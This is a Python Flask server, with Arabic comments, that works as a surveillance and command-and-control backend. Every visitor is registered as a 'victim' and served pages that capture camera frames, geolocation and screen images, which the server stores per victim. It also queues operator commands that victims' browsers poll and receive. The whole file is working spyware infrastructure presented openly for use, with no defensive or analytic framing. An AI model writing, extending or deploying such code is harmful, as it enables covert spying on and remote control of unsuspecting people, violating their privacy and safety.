from flask import Flask, request, jsonify, render_template
import os
import uuid
import json
from datetime import datetime

app = Flask(__name__)

victims = {}
geo_data = {}
screen_frames = {}

# تسجيل الضحية تلقائياً
@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {}

    victims_file = 'victims.json'
    victims_list = []

    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []

    victim_data = {
        "id": victim_id,
        "status": "online",
        "last_seen": datetime.utcnow().isoformat()
    }
    victims_list.append(victim_data)

    with open(victims_file, 'w', encoding='utf-8') as f:
        json.dump(victims_list, f, indent=2, ensure_ascii=False)

    print(f"[REGISTER] Victim {victim_id} registered automatically.")
    return render_template("index.html", victim_id=victim_id)

# صفحات الضحية
@app.route("/camera.html")
def camera_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("camera.html", victim_id=victim_id)

@app.route("/geo.html")
def geo_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("geo.html", victim_id=victim_id)

@app.route("/screenshare.html")
def screenshare_page():
    victim_id = request.args.get("victim")
    if not victim_id:
        return "Missing victim ID", 400
    return render_template("screenshare.html", victim_id=victim_id)

# استقبال صور الكاميرا
@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    frame = request.data
    if not os.path.exists("camera"):
        os.makedirs("camera")

    file_path = os.path.join("camera", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    print(f"[CAMERA] Frame saved for Victim {victim_id}")
    return jsonify({"status": "ok"})

# استقبال بيانات الموقع
@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")

    geo_data[victim_id] = {"lat": lat, "lon": lon}
    print(f"[GEO] Victim {victim_id} => Lat: {lat}, Lon: {lon}")

    return jsonify({"status": "ok"})

# استقبال لقطات الشاشة
@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    frame = request.data
    if not os.path.exists("screens"):
        os.makedirs("screens")

    file_path = os.path.join("screens", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    screen_frames[victim_id] = file_path
    print(f"[SCREEN] Frame saved for Victim {victim_id}")

    return jsonify({"status": "ok"})

# عرض قائمة الضحايا
@app.route('/api/victims', methods=['GET'])
def get_victims():
    victims_file = 'victims.json'
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []
    else:
        victims_list = []
    return jsonify(victims_list)

# استقبال أوامر من الـ CLI
@app.route("/api/execute", methods=["POST"])
def execute_command():
    data = request.get_json()
    victim_id = data.get("victim_id")
    command = data.get("command")

    if not victim_id or not command:
        return jsonify({"error": "victim_id and command are required"}), 400

    commands_file = f"commands_{victim_id}.json"
    commands = []
    if os.path.exists(commands_file):
        with open(commands_file, "r", encoding="utf-8") as f:
            try:
                commands = json.load(f)
            except json.JSONDecodeError:
                commands = []

    commands.append({"command": command})
    with open(commands_file, "w", encoding="utf-8") as f:
        json.dump(commands, f, indent=2, ensure_ascii=False)

    print(f"[COMMAND] Added for {victim_id}: {command}")
    return jsonify({"status": "ok"})

# تسليم الأوامر للضحية
@app.route("/api/poll_commands", methods=["GET"])
def poll_commands():
    victim_id = request.args.get("victim_id")
    if not victim_id:
        return jsonify({"error": "victim_id is required"}), 400

    commands_file = f"commands_{victim_id}.json"
    commands = []
    if os.path.exists(commands_file):
        with open(commands_file, "r", encoding="utf-8") as f:
            try:
                commands = json.load(f)
            except json.JSONDecodeError:
                commands = []
        os.remove(commands_file)

    return jsonify(commands)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
